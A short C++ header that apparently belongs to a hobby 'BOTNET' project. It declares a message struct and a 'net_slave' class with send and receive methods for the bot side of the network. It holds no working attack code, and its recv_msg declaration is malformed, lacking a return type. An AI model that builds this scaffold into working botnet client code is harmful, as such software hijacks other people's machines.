//
// Created by notroot on 04/12/2020.
//
#include <string>
#ifndef BOTNET_NET_SLAVE_H
#define BOTNET_NET_SLAVE_H

struct msg {
    std::string data;
    int numMsg;
    int controlCode;
};

class net_slave {
    public: bool send_msg(struct msg);
    public: struct recv_msg();
};


#endif //BOTNET_NET_SLAVE_H
